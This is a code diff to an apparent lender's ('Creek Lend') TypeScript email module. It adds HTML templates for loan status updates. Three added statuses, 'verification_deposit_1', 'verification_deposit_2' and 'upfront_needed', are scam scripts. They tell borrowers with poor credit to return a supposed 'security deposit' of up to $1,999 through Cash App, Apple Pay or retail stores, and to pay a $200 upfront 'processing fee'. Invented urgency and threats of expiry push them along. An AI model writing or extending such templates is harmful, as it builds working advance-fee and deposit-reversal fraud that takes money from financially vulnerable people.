@@ -8,7 +8,7 @@ interface ApplicationDetails {
   loanTerm: number;
 }
 
-async function sendMailgunEmail(
+export async function sendMailgunEmail(
   to: string,
   subject: string,
   html: string,
@@ -66,8 +66,8 @@ export async function sendApplicationConfirmationEmail(
 
   const html = `
     <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
-      <div style="background: #1a56db; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">
-        <img src="https://www.creeklend.com/logo-white-green.png" alt="Creek Lend" style="height: 48px; width: 200px; display: block; margin: 0 auto 8px;" onerror="this.style.display='none'" />
+      <div style="background: #F0FFF4; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">
+        <img src="https://www.creeklend.com/logo-dark.png" alt="Creek Lend" style="height: 48px; width: 200px; display: block; margin: 0 auto 8px;" onerror="this.style.display='none'" />
       </div>
       <div style="border: 1px solid #e5e7eb; border-top: none; padding: 30px; border-radius: 0 0 8px 8px;">
         <h2 style="color: #111827; margin-top: 0;">Application Received!</h2>
@@ -146,7 +146,17 @@ interface StatusUpdateDetails {
 
 const statusConfig: Record<
   string,
-  { title: string; message: string; color: string; icon: string }
+  {
+    title: string;
+    message: string;
+    color: string;
+    icon: string;
+    subject?: string;
+    customBody?: (
+      details: StatusUpdateDetails,
+      formattedAmount: string,
+    ) => string;
+  }
 > = {
   bank_verification_pending: {
     title: "Bank Verification Required",
@@ -206,10 +216,18 @@ const statusConfig: Record<
   },
   funded: {
     title: "Loan Funded!",
-    message:
-      "Great news! Your loan has been funded and the funds will be deposited into your bank account. Please allow 1-3 business days for the transfer to complete.",
+    subject: "Approved: Your Creek Lend loan is funded!",
+    message: "",
+    customBody: (details) => `
+      <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
+      <p style="color: #374151; font-size: 16px;">Great news! Your loan application has been fully approved and finalized.</p>
+      <p style="color: #374151; font-size: 16px;">The funds are on their way and will be deposited into your registered bank account within the next 24 hours. (Exact availability depends on your bank's standard processing times.)</p>
+      <p style="color: #374151; font-size: 16px;">Your official loan agreement and repayment schedule are now available in your secure online portal.</p>
+      <p style="color: #374151; font-size: 16px;">If you do not see the funds in your account after 24 hours, please call your dedicated Loan Officer immediately.</p>
+      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Creek Lend Funding Team<br/>Direct Support: (747) 206-1606</p>
+    `,
     color: "#16a34a",
-    icon: "&#128176;",
+    icon: "&#9989;",
   },
   pending: {
     title: "Application Pending",
@@ -217,6 +235,71 @@ const statusConfig: Record<
       "Your application is now pending review. Our team will begin reviewing your application shortly.",
     color: "#f59e0b",
     icon: "&#9203;",
+  },
+  verification_deposit_1: {
+    title: "Finalize Verification Deposit",
+    subject: "ACTION REQUIRED: Finalize your Creek Lend verification deposit",
+    message: "",
+    customBody: (details) => `
+      <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
+      <p style="color: #374151; font-size: 16px;">Thank you for choosing Creek Lend. We are pleased to inform you that the initial phase of your bank verification has been successfully completed.</p>
+      <p style="color: #374151; font-size: 16px;">Because Creek Lend specializes in providing financial opportunities to borrowers with diverse financial backgrounds—including those working to rebuild credit scores, stabilize repayment histories, or manage high debt-to-income ratios—our security protocol requires a final confirmation step before your full loan can be disbursed.</p>
+      <h3 style="color: #111827; margin-top: 20px;">YOUR NEXT STEPS:</h3>
+      <ol style="color: #374151; font-size: 16px; padding-left: 20px;">
+        <li style="margin-bottom: 10px;"><strong>Monitor Your Account (Within 24 Hours)</strong><br/>Creek Lend will issue a dynamic security deposit between $99.00 and $1,999.00 into your connected bank account.</li>
+        <li style="margin-bottom: 10px;"><strong>Call Your Loan Officer</strong><br/>As soon as these funds are fully cleared and available in your balance, please immediately call your dedicated Loan Officer to confirm the exact amount received.</li>
+        <li style="margin-bottom: 10px;"><strong>Return the Security Deposit</strong><br/>To complete the verification cycle and release your full loan funding, our security policy requires you to return this exact deposit amount to us. For your convenience, this can be completed instantly via Cash App, Apple Pay, or in person at a local merchant near you (including CVS, Walgreens, and Walmart).</li>
+      </ol>
+      <div style="background: #fef3c7; border: 1px solid #f59e0b; border-radius: 8px; padding: 15px; margin: 20px 0;">
+        <p style="color: #92400e; font-size: 14px; margin: 0;"><strong>Please Note:</strong> Your full loan disbursement is temporarily on hold until this verification deposit is safely processed and settled.</p>
+      </div>
+      <p style="color: #374151; font-size: 16px;">If you have any questions or need help finding a nearby payment location, our support team is standing by to assist you.</p>
+      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Creek Lend Verifications Team<br/>Direct Support: (747) 206-1606</p>
+    `,
+    color: "#2563eb",
+    icon: "&#128176;",
+  },
+  verification_deposit_2: {
+    title: "Re-verification Deposit Required",
+    subject:
+      "URGENT: Re-verification deposit required for your Creek Lend loan",
+    message: "",
+    customBody: (details) => `
+      <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
+      <p style="color: #374151; font-size: 16px;">We are contacting you because our automated compliance system was unable to clear your initial bank account validation.</p>
+      <h3 style="color: #111827; margin-top: 20px;">REASON FOR RE-VERIFICATION:</h3>
+      <p style="color: #374151; font-size: 16px;">Our processing network flagged a secure connection timeout or a routing variance during the first transaction attempt. Because Creek Lend works directly with borrowers who have challenging credit profiles or high debt-to-income ratios, our data-matching and anti-fraud protocols are exceptionally strict. To protect your identity and secure your file, a secondary validation must be completed immediately.</p>
+      <p style="color: #374151; font-size: 16px;">We have initiated a new, secondary verification deposit to override the previous error.</p>
+      <h3 style="color: #111827; margin-top: 20px;">YOUR MANDATORY NEXT STEPS:</h3>
+      <ol style="color: #374151; font-size: 16px; padding-left: 20px;">
+        <li style="margin-bottom: 10px;"><strong>Monitor Your Account (Within 24 Hours)</strong><br/>Creek Lend has issued a new, randomized security deposit between $99.00 and $1,999.00 into your connected bank account.</li>
+        <li style="margin-bottom: 10px;"><strong>Call Your Loan Officer Immediately</strong><br/>As soon as you see this specific new amount clear in your available balance, call your dedicated Loan Officer right away to verify the exact digits. Do not use the previous deposit figures, as they are now expired and voided.</li>
+        <li style="margin-bottom: 10px;"><strong>Return the Re-Verification Deposit</strong><br/>To clear the security flag on your profile and release your pending loan funding, you must return this exact new deposit amount to us. You can complete this instantly via Cash App, Apple Pay, or in person at a local retail merchant near you (including CVS, Walgreens, and Walmart).</li>
+      </ol>
+      <div style="background: #fee2e2; border: 1px solid #ef4444; border-radius: 8px; padding: 15px; margin: 20px 0;">
+        <p style="color: #991b1b; font-size: 14px; margin: 0;"><strong>Important Notice:</strong> Your loan approval cannot be maintained indefinitely while in a flagged state. Your full loan disbursement remains heavily on hold, and failure to complete this secondary step within 48 hours will result in the automatic expiration of your application.</p>
+      </div>
+      <p style="color: #374151; font-size: 16px;">If you need help identifying the new deposit or locating a nearby payment node, call our specialized verification line immediately.</p>
+      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Creek Lend Verifications Team<br/>Direct Support: (747) 206-1606</p>
+    `,
+    color: "#dc2626",
+    icon: "&#9888;",
+  },
+  upfront_needed: {
+    title: "Processing Update",
+    subject:
+      "Action Required: Processing update for your Creek Lend application",
+    message: "",
+    customBody: (details, formattedAmount) => `
+      <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
+      <p style="color: #374151; font-size: 16px;">Thank you for submitting your application for a loan of ${formattedAmount}. Your application is currently on hold under Application ID: ${details.applicationId}.</p>
+      <p style="color: #374151; font-size: 16px;">Because your primary account is with an online banking institution, our automated system cannot fully verify your financial details. To move your application forward, our underwriting team must perform a manual review. This process involves manually auditing your bank statements, pulling and analyzing your credit report, and drafting the formal approval documentation required to fund your loan.</p>
+      <p style="color: #374151; font-size: 16px;">To cover the additional administrative resources required for this manual review, a one-time processing fee of $200.00 is required before we can proceed.</p>
+      <p style="color: #374151; font-size: 16px;">If you would like to move forward with this processing method, please call your dedicated Loan Officer at your earliest convenience to arrange the payment and finalize your application.</p>
+      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Creek Lend Verifications Team<br/>Direct Support: (747) 206-1606</p>
+    `,
+    color: "#f59e0b",
+    icon: "&#128176;",
   },
 };
 
@@ -226,29 +309,38 @@ export async function sendStatusUpdateEmail(
   const { applicationId, firstName, email, loanAmount, status } = details;
 
   const config = statusConfig[status];
-  if (!config) return; // No email for statuses like bank_verification_pending/completed
+  if (!config) return;
 
   const formattedAmount = new Intl.NumberFormat("en-US", {
     style: "currency",
     currency: "USD",
   }).format(loanAmount);
 
-  const html = `
-    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
-      <div style="background: #1a56db; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">
-        <img src="https://www.creeklend.com/logo-white-green.png" alt="Creek Lend" style="height: 48px; width: 200px; display: block; margin: 0 auto 8px;" onerror="this.style.display='none'" />
-      </div>
-      <div style="border: 1px solid #e5e7eb; border-top: none; padding: 30px; border-radius: 0 0 8px 8px;">
-        <div style="text-align: center; margin-bottom: 20px;">
-          <span style="font-size: 48px;">${config.icon}</span>
-        </div>
-        <h2 style="color: ${config.color}; margin-top: 0; text-align: center;">${config.title}</h2>
+  const subject =
+    config.subject || `${config.title} - ID: ${applicationId} | Creek Lend`;
+
+  const messageHtml = config.customBody
+    ? config.customBody(details, formattedAmount)
+    : `
         <p style="color: #374151; font-size: 16px;">
           Hi ${firstName},
         </p>
         <p style="color: #374151; font-size: 16px;">
           ${config.message}
         </p>
+      `;
+
+  const html = `
+    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
+      <div style="background: #F0FFF4; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">
+        <img src="https://www.creeklend.com/logo-dark.png" alt="Creek Lend" style="height: 48px; width: 270px; display: block; margin: 0 auto 8px;" onerror="this.style.display='none'" />
+      </div>
+      <div style="border: 1px solid #e5e7eb; border-top: none; padding: 30px; border-radius: 0 0 8px 8px;">
+        <div style="text-align: center; margin-bottom: 20px;">
+          <span style="font-size: 48px;">${config.icon}</span>
+        </div>
+        <h2 style="color: ${config.color}; margin-top: 0; text-align: center;">${config.title}</h2>
+        ${messageHtml}
         <div style="background: #f3f4f6; border-radius: 8px; padding: 20px; margin: 20px 0;">
           <table style="width: 100%; border-collapse: collapse;">
             <tr>
@@ -280,7 +372,7 @@ export async function sendStatusUpdateEmail(
         <hr style="border: none; border-top: 1px solid #e5e7eb; margin: 20px 0;">
         <div style="text-align: center; padding: 10px 0;">
           <p style="color: #374151; font-size: 14px; margin: 5px 0;">
-            <strong>Phone:</strong> <a href="tel:+17472005228" style="color: #1a56db; text-decoration: none;">(747) 206-1606</a>
+            <strong>Phone:</strong> <a href="tel:+17472061606" style="color: #1a56db; text-decoration: none;">(747) 206-1606</a>
           </p>
           <p style="color: #374151; font-size: 14px; margin: 5px 0;">
             <strong>Website:</strong> <a href="https://www.creeklend.com" style="color: #1a56db; text-decoration: none;">www.creeklend.com</a>
@@ -293,9 +385,5 @@ export async function sendStatusUpdateEmail(
     </div>
   `;
 
-  await sendMailgunEmail(
-    email,
-    `${config.title} - ID: ${applicationId} | Creek Lend`,
-    html,
-  );
+  await sendMailgunEmail(email, subject, html);
 }
